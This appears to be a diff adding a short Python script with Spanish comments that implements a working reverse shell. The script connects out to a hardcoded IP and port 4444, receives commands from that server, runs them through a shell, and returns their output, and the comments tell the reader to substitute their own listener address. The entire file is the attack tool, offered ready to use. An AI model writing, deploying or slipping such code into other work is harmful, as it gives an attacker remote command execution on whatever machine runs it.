@@ -1,0 +1,37 @@
+import socket
+import subprocess
+import os
+
+def reverse_shell():
+    # Dirección IP y puerto del servidor al que se conectará la reverse shell
+    server_ip = '192.168.1.100'  # Cambia esto por la IP del servidor
+    server_port = 4444  # Cambia esto por el puerto que estás escuchando en el servidor
+
+    # Crear socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    # Conectar al servidor
+    s.connect((server_ip, server_port))
+
+    while True:
+        # Recibir el comando del servidor
+        command = s.recv(1024).decode("utf-8")
+
+        if command.lower() == 'exit':
+            break
+
+        # Ejecutar el comando y obtener la salida
+        if command.startswith('cd '):
+            try:
+                os.chdir(command.strip('cd '))
+                s.send(b'Changed directory')
+            except FileNotFoundError as e:
+                s.send(str(e).encode())
+        else:
+            output = subprocess.run(command, shell=True, capture_output=True)
+            s.send(output.stdout + output.stderr)
+
+    s.close()
+
+if __name__ == "__main__":
+    reverse_shell()
